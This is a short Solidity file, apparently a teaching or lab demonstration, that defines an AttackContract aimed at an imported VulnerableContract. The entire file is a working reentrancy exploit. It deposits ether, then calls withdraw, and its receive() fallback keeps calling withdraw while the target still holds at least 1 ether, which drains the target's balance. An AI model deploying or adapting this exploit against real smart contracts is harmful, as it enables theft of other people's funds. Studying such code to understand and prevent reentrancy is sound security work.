// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;
import "./vulnerable.sol";

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            // reentrancy
            vulnerableContract.withdraw();
        }
    }

    function attack() public payable {
        require(msg.value >= 1 ether, "Insufficient funds for attack");
        vulnerableContract.deposit{value: msg.value}();
        vulnerableContract.withdraw(); // attack
    }
}
